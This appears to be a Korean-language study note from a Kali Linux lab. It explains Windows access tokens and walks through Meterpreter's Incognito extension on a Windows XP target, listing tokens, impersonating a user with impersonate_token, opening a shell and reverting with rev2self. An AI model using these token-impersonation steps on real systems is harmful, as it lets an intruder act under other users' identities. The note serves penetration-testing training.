# Incognito
토큰(Token) : 매번 개인정보(암호)를 제시하지 않고도 시스템이나 네트워크에 액세스 할 수 있게 해 주는 템포러리 파일. 두 가지 종류의 토큰이 있다.  
- Delegate : 원격 데스크탑으로 머신에 로그인하거나 연결하는 등의 상호적인 로그인을 위해 생성됨.  
- Impersonate : 네트워크 드라이브나 스크립트의 도메인 로그를 부여하는 등의 비상호적인 세션을 위해 생성됨.  
→ 시스템이 재부팅 되어도 유지된다는 장점이 있다.  

## 실습
Kali에서 Windows XP를 타겟으로 한 meterpreter 세션을 연다.  
**run**  
**load incognito**  
Incognito 모듈 로드  
**help incognito**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/Incognito/Source/Incognito%20%EC%A4%80%EB%B9%84.png)

이제 첫번째로 해야하는 일은 Window Xp에 유용한 토큰이 있는지 확인하기 위해 토큰을 나열하는 것이다.  
**list_tokens**  
**list_tokens -u**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/Incognito/Source/Incognito%20token.png)  

그 다음에 해야하는 일은 administrator을 흉내내고 현재 유저 아이디를 확인한다.  

**impersonate_token USER-K3AEH9K6N\\User1**  
**getuid**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/Incognito/Source/Incognito%20token%EC%9C%BC%EB%A1%9C%20%EA%B3%84%EC%A0%95.png)

쉘을 열어 우리가 누군지 확인한다.  
**shell**  
**whoami**  
**echo %USERDOMAIN%/%USERNAME%**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/Incognito/Source/Incognito%20shell.png)  
우리는 user라는 것을 확인할 수 있다.  
Ctrl+C를 눌러 shell을 종료해준다.  

**rev2self**  
**getuid**  
**shell**  
**echo %USERDOMAIN%/%USERNAME%**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Meterpreter%20Extensions/Incognito/Source/user%ED%99%95%EC%9D%B8.png)  
다시 시스템 유저로 진입한 후 현재 우리가 무엇인지 확인한다.  
